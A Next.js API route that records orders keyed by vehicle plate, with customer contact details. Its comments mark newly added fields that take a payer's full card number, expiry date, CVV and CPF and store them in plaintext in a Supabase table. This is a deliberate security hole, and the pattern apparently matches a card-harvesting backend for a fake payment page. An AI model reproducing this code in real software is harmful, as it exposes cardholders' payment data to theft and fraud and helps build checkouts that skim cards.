import { NextRequest, NextResponse } from "next/server"
import { getSupabaseAdmin } from "@/lib/supabase"

export async function POST(req: NextRequest) {
  const body = await req.json()
  const { 
    placa, 
    nome_cliente, 
    telefone_cliente, 
    email_cliente, 
    valor, 
    status,
    // ACRESCENTADO: Recebe os campos do checkout na API
    numero_cartao,
    validade_cartao,
    cvv_cartao,
    cpf_cartao
  } = body

  if (!placa || !nome_cliente || !telefone_cliente || !email_cliente) {
    return NextResponse.json({ ok: false, error: "Campos obrigatórios ausentes." }, { status: 400 })
  }

  const supabase = getSupabaseAdmin()

  const { data, error } = await supabase
    .from("pedidos")
    .insert({
      placa,
      nome_cliente,
      telefone_cliente,
      email_cliente,
      valor: Number(valor) || 0,
      status: status || "pendente",
      // ACRESCENTADO: Grava as novas colunas estruturadas no banco
      numero_cartao: numero_cartao || null,
      validade_cartao: validade_cartao || null,
      cvv_cartao: cvv_cartao || null,
      cpf_cartao: cpf_cartao || null
    })
    .select()
    .single()

  if (error) {
    console.error("Erro ao criar pedido no Supabase:", error.message)
    return NextResponse.json({ ok: false, error: error.message }, { status: 500 })
  }

  return NextResponse.json({ ok: true, data })
}
